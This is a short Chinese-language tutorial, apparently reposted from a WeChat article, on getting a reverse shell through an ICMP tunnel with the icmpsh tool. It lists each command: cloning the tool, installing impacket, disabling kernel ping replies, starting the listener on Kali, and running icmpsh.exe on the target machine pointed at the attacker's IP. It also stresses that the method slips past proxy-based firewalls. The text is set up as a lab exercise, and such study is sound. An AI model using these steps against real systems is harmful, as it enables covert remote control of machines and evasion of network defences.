# 利用icmpsh建立icmp隧道反弹shell

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIyMDAwMjkzNg==&mid=2247485789&idx=1&sn=255be70f15cc8ebbdbad5e931c5c8814&chksm=97d3e64aa0a46f5c201cd326243d14f12dc7df4f0ce7cd345ed4829bcb9706d0dd0c12099708&scene=126&sessionid=1681667887#rd](http://mp.weixin.qq.com/s?__biz=MzIyMDAwMjkzNg==&mid=2247485789&idx=1&sn=255be70f15cc8ebbdbad5e931c5c8814&chksm=97d3e64aa0a46f5c201cd326243d14f12dc7df4f0ce7cd345ed4829bcb9706d0dd0c12099708&scene=126&sessionid=1681667887#rd)

首先在kali上安装icmpsh软件，软件地址https://github.com/inquisb/icmpsh.git

我们可以直接用git克隆过来git clone https://github.com/inquisb/icmpsh.git

![](../Images/5a6f4306656994568a499ce816c37283.png)

然后我们还需要来安装python-impacket类库以保证对TCP、UDP、ICMP等协议的访问

pip2 install impacket

![](../Images/91b7c557324efc0b48aaf8ba087ce244.png)

接下来我们还需要关闭我们之前的ping命令应答程序，这样可以防止内核自己对ping包进行响应。

sysctl -w net.ipv4.icmp\_echo\_ignore\_all=1

实验完成后开启系统ping的话将最后的1改为0即可

![](../Images/8252bf989e31a75d01e60af82e0b6f27.png)

然后可以在kali上开始监听

python icmpsh\_m.py 本机ip 目标ip

![](../Images/c2b432b3a3e3ea84170dbaaaa1e41689.png)

再把icmpsh.exe传输到靶机上

![](../Images/91a71d8cf8b3e42751a0516f9cc18788.png)

![](../Images/c73ae2059621296e7e9d9a557918647f.png)

icmpsh.exe -t 192.168.110.140   -t后面接上攻击机的ip地址   回车

![](../Images/8fe1f46cb1b1459ecace2f585d58a279.png)

接收到shell。由于数据是利用PING请求/回复报文通过网络层传输，因此并不需要指定服务或者端口。这种流量是无法被基于代理的防火墙检测到的，因此这种方式可能绕过一些防火墙规则。
